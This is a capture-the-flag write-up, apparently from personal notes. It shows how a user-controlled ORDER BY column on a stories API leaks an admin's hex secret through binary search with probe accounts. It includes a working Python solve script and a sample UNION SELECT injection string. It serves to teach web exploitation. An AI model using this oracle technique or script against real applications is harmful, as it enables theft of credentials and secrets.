
![[Pasted image 20260816135930.png]]

![[Pasted image 20260816140147.png]]

From the source code above, we know that somehow we need to get the admin's `secret` or become one of the admin's close friends

![[Pasted image 20260816140426.png]]

![[Pasted image 20260816140544.png]]

From the source code, it looks like there are many fields we can try to inject into with SQL injection because the queries aren't parameterized. However, whenever we try a basic SQLi payload, we only get the error `"nuh uh"`.

So, there must be some kind of filtering happening before our input reaches the query.

![[Pasted image 20260816140822.png]]

![[Pasted image 20260816140837.png]]

And I found this filter. It only allows characters from an alphanumeric , so we can't use normal SQLi characters like quotes, spaces, or operators, e.g. `' UNION SELECT secret FROM users --`

While checking the requests in Burp Suite, I noticed that the `column` parameter is user-controlled

So, I tried changing it from `name` to `secret`

![[Pasted image 20260816141212.png]]

And it worked. The response order changed based on the users' `secret` values.

This means we can control which database column is used for sorting, which might give us a way to leak the admin's secret indirectly.

![[Pasted image 20260816141440.png]]

The `ORDER BY` primitive lets us compare the `secret` values of users who have published a story.

One important limitation is that **only users with a story are included in the result**, so if we want to compare our own secret against the admin's secret, our account also needs to publish a story first.

Before exploiting this, we need to understand how the secret is generated

![[Pasted image 20260816141742.png]]

This gives us a **16-character hexadecimal string**, ranging from 0000000000000000 to ffffffffffffffff

Now we can create our own accounts with chosen passwords, publish a story from each account, and use

``` js
?column=secret&order=ASC
```

to check whether our password higher or lower compare to  admin's secret.

Instead of trying every possible value, we can make this much faster with a [**binary search**](https://www.geeksforgeeks.org/dsa/binary-search/) over the hexadecimal range.

but we still hve a problem: `ORDER BY` only tells us whether our value is before or after the admin's value. It doesn't directly give us an `==` condition.

To handle that, we append one extra character to our probe. For example: <16-hex-candidate>+'g'

Why we add one character? , because we will take advantage from how lexicographic sort works

The comparison only continues to the next character if all previous characters are equal

For example, if we sort:

```
abc
acd
abcd
```

When comparing `abc` with `acd`, the comparison already stops at the second character:
```
abc
 ^
acd
 ^
```
 
because `b < c`

But when comparing `abc` with `abcd`, the first three characters are all identical so the comparison has to continue until the end of `abc`. Since `abcd` still has one extra character, we get:

```
abc < abcd
```

We can abuse this behavior by appending one extra character, like `g`, to our 16-character probe.

The extra `g` will only affect the result **if all 16 characters before it are exactly the same as the admin secret**.

So during the binary search, the database is basically forced to compare our candidate against the admin secret character by character, and that extra character gives us a useful boundary when our 16-character guess is an exact match.

solve.py

``` python
import requests

base ="{TARGET_URL}"

count = 0

def make_acc(x):
    global count

    count += 1
    user = "Gokong" + str(count)
    pw = f"{x:016x}g"

    s = requests.Session()

    r = s.post(base + "/api/signup", json={"name": user, "password": pw})
    r.raise_for_status()

    r = s.post(base + "/api/stories", json={
        "story": "a",
        "visibility": "public",
        "minutes": 60
    })
    r.raise_for_status()

    return s, user, pw

def check(x):
    s, user, pw = make_acc(x)

    r = s.get(base + "/api/stories?column=secret&order=ASC")
    data = r.json()

    authors = [x["author"] for x in data]

    me = authors.index(user)
    admin = authors.index("admin")

    if me < admin:
        return True

    return False

lo = 0
hi = 0xffffffffffffffff

while lo < hi:
    mid = (lo + hi) // 2

    if check(mid):
        lo = mid + 1
    else:
        hi = mid

secret = f"{lo:016x}"
print("\nadmin secret:", secret)
```

![[Pasted image 20260816154450.png]]